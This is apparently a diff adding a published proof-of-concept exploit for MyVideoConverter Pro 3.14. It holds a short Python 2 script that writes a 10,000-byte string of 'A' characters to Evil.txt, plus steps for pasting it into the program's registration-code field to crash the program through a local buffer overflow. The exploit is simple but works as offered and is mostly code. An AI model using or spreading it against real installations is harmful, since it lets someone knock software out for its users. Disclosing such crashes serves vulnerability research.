@@ -1,0 +1,29 @@
+# Exploit Title: MyVideoConverter Pro 3.14 Denial of Service
+# Date: 03.02.2019
+# Vendor Homepage: http://www.ivideogo.com/
+# Software Link :  http://www.ivideogo.com/
+# Exploit Author: Achilles
+# Tested Version: 3.14
+# Tested on: Windows 7 x64
+# Vulnerability Type: Denial of Service (DoS) Local Buffer Overflow
+ 
+# Steps to Produce the Crash: 
+# 1.- Run python code : MyVideoConverter_Pro.py
+# 2.- Open EVIL.txt and copy content to clipboard
+# 3.- Open MyVideoConverter Pro
+# 4.- Paste the content of EVIL.txt into the field: 'Copy and Paste Registration Code'
+# 5.- Click ok
+# 5.- And you will see a crash.
+
+#!/usr/bin/env python
+
+buffer = "\x41" * 10000
+
+try:
+	f=open("Evil.txt","w")
+	print "[+] Creating %s bytes evil payload.." %len(buffer)
+	f.write(buffer)
+	f.close()
+	print "[+] File created!"
+except:
+	print "File cannot be created"
